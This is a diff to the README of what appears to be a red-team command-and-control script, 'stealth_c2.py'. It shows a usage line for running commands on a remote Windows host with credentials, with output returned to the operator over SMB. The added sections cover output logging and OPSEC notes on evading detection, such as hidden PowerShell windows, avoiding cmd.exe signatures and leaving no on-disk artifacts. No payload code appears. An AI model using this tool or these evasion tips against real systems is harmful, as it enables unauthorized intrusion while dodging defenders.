@@ -45,7 +45,6 @@ pip install .
 python3 stealth_c2.py <TARGET> <USERNAME> <PASSWORD> --domain <DOMAIN> --lhost <YOUR_IP>
 ```
 
-
 | Arg      | Description                         |
 | -------- | ----------------------------------- |
 | TARGET   | Remote Windows IP                   |
@@ -54,8 +53,18 @@ python3 stealth_c2.py <TARGET> <USERNAME> <PASSWORD> --domain <DOMAIN> --lhost <
 | --domain | Domain (leave blank for local user) |
 | --lhost  | Your IP for receiving output (SMB)  |
 
+## 📂Output
 
+- Logs are saved in: `/tmp/dropzone/`
+- Each command generates: `result_<timestamp>.log`
+- Output is pulled directly via SMB
 
+## 🛡️OPSEC Notes
+
+- No `cmd.exe /c` — common alert signature
+- `powershell.exe -WindowStyle Hidden` used for execution
+- SMB authentication avoids Windows 10/11 guest access blocks
+- No on-disk payloads or artifacts
 
 
 
